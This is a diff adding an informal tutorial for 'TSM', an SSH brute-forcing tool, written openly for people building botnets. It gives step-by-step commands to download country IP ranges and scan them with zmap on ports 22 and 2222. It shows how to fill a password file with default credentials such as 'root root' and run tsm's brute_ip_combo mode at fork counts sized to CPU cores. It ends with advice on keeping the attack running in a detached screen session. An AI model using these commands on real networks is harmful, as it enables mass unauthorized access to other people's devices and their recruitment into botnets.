@@ -1,0 +1,57 @@
+--Merlyns TSM TUTORIAL--
+
+
+----------------------
+how to start bruting?
+-----------------------
+http://ipdeny.com/ipblocks/ 
+and pick any country you want or if you wanna combine them together i would tell you it's best for people that are doing botnets
+usa, poland, uk, and countries where the internet speed isn't shit for good devices you can 
+
+
+-----------------------
+so when you zmapping right and whatever zone or country you picked out to bruteforce you will do for example 
+wget http://ipdeny.com/ipblocks/data/countries/al.zone
+
+for example 
+port can be changed to multiple others but you will need to change in tsm line too 
+zmap -p22 -oi -wal.zone 
+zmap -p2222 -oi -wal.zone
+
+it'll output everything in file 'i' i will hand you over a server for you to get started but zmapping is the only thing you will have to worry about unless
+you want me to zmap for you and pay 
+
+once you have that put that inside the folder that you have tsm in and create a file name 'p' is where you will storing the passwords and etc
+
+for example of password and how it needs to be placed is like this 
+tsm only does one at a time btw 
+
+root root
+admin admin
+
+after that and btw you have to make sure everything is the same folder that tsm is in 
+after everything created 
+best advice when you starting off man 
+
+1-2 cores == 1-50k forks
+4 cores = 80k forks
+8 cores can handle 400k forks
+16 cores can handle a good 1M
+
+./tsm -m brute_ip_combo -f <1-100000> -p 22 -v 'g0d!!!' -d 2 -r 10000
+1-2 cores
+./tsm -m brute_ip_combo -f 50000 -p 22 -v 'g0d!!!' -d 2 -r 10000
+4 cores 
+./tsm -m brute_ip_combo -f 80000 -p 22 -v 'g0d!!!' -d 2 -r 10000
+8 cores 
+./tsm -m brute_ip_combo -f 400000 -p 22 -v 'g0d!!!' -d 2 -r 10000
+16 cores 
+./tsm -m brute_ip_combo -f 100000000000 -p 22 -v 'g0d!!!' -d 2 -r 100000000000
+example of different uses of targetting other ports
+./tsm -m brute_ip_combo -f 1000000 -p 2222 -v 'g0d!!!' -d 2 -r 10000
+
+you see the -p that's what i meant you could target different kind of ports and devices
+
+and you can let the process go on a screen in the background and go on with your day 
+
+do this screen and then inside the run command and then deattach the screen 
